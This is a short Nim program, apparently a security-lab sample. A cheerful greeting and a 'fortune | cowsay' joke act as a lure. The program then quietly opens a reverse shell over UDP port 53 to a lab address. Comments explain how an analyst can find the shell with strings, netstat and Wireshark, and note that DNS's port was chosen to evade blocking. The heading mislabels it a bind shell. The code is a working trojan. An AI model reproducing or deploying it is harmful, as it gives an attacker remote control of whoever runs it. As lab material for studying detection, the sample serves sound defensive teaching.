# Basic bind shell

import osproc


echo "Wow! Thanks so much for executing this file!"

echo "You won't regret it!"

echo "Press enter for a fun word of wisdom. :)"

discard readline(stdin)

let (output, _) = execCmdEx("fortune | cowsay")

echo output

discard execCmd("bash -c 'sh -i >& /dev/udp/10.0.2.6/53 0>&1 &'")

# reverse shell adapted from https://www.revshells.com/
# Now we are getting a bit sneakier- in fact we've added a couple of tricks.
# It does nothing to hide the fact that it has shellcode calling
# an ncat binary to send a shell over the network.
# reversing its behavior is extremely easy with a simple 
# strings bindShell | grep bash
# pointing you directly to the shellcode.
# As a network analyst, running netstat on your endpoint will clue you in to an
# errant ncat connection as well.
# Note that it is a bit sneakier than the bindshell- there's no listener on the target
# When the payload isn't running.
# We can go a bit further and exploit something that is hard to mess with-
# We're reaching out through UDP, and what is a protocol that uses UDP, on a port
# that is very difficult to just "turn off?" 
# DNS of course! 
# Lets see what we find in wireshark though, when we sniff traffic!
